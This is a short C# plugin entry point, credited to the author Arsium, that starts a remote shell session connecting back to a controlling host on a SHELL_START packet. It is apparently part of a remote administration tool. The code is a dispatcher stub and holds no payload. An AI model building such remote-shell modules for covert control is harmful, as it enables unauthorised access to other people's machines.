using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;

        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.CurrentPacket.PacketType)
            {
                case PacketType.SHELL_START:
                    clientHandler = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID, ((StartShellSessionPacket)loadingAPI.CurrentPacket).isPWS);
                    clientHandler.ConnectStart();
                    break;
                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
